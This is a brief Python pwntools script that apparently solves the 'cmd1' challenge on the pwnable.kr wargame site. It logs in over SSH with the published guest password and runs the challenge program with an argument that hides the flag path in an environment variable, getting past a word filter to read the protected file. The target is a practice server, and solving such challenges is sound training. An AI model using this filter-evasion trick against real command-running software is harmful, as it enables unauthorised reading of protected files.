#! /usr/bin/python

from pwn import *

HOST = "pwnable.kr"
PORT = 2222
USER = "cmd1"

s = ssh(host=HOST, user=USER,
        port=PORT, password='guest')

cmd = 'env FLAG=/home/cmd1/flag ./cmd1 "/bin/cat \$FLAG"'
ret = s.run_to_end(cmd)
print ret[0]
s.close()
